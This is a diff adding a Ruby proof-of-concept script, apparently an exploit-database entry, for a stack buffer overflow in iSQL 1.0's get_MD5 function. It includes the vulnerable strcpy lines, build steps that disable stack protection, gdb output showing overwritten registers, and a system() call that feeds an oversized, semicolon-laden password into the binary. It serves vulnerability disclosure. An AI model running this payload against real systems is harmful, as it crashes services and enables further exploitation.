@@ -1,0 +1,64 @@
+#!/bin/ruby
+# Exploit Title: iSQL(RL) 1.0 - Buffer Overflow(isql_main.c)
+# Date: 2016-06-13
+# Exploit Author: HaHwul
+# Exploit Author Blog: www.hahwul.com
+# Vendor Homepage: https://github.com/roselone/iSQL
+# Software Link: https://github.com/roselone/iSQL/archive/master.zip
+# Version: 1.0
+# Tested on: Debian [wheezy]
+# CVE : none
+=begin
+### Vulnerability Point
+ :: [isql_main.c 453 line] strcpy((char *)cmd+5,str); code is vulnerable
+ :: don't check str size
+446 char *get_MD5(char *str){
+447         FILE *stream;
+448         char *buf=malloc(sizeof(char)*33);
+449         char cmd[100];
+450         memset(buf,'\0',sizeof(buf));
+451         memset(cmd,'\0',sizeof(cmd));
+452         strcpy(cmd,"echo "); //5
+453         strcpy((char *)cmd+5,str);
+
+Edit makefile > CFLAGS = -fno-stack-protector
+#> make
+
+### gdb history
+(gdb) r
+Starting program: /home/noon/Noon/LAB/exploit/vuln_test/iSQL/isql
+
+*************** welcome to ISQL ****************
+* version 1.0                                  *
+* Designed by RL                               *
+* Copyright (c) 2011, RL. All rights reserved  *
+************************************************
+
+>username: hwul_test
+>password: AAAAAAAAAAAAAAAAAAAAAAAAAA...  ("A" * 800)
+Program received signal SIGSEGV, Segmentation fault.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0x000000000040644c in get_MD5 ()
+
+(gdb) x/s $rax
+0x4141414141414141:     <error: Cannot access memory at address 0x4141414141414141>
+
+(gdb) x/s $rbp
+0x4141414141414141:     <error: Cannot access memory at address 0x4141414141414141>
+
+### Registers
+(gdb) i r
+rax            0x4141414141414141       4702111234474983745
+rbx            0x0      0
+rcx            0x7ffff7b06480   140737348920448
+rdx            0x0      0
+rsi            0x60b610 6338064
+rdi            0x5      5
+rbp            0x4141414141414141       0x4141414141414141
+rsp            0x7fffffffe948   0x7fffffffe948
+r8             0xffffffff       4294967295
+r9             0x0    
+=end
+puts "iSQL 1.0 - Buffer Overflow"
+puts " - by hahwul"
+puts " - Run BUG.."
+buffer = "A"*800 
+system("(sleep 5; echo -en 'hwul\n';sleep 1;echo -en 'asdf;#{buffer};echo 1';sleep 10) | ./isql")
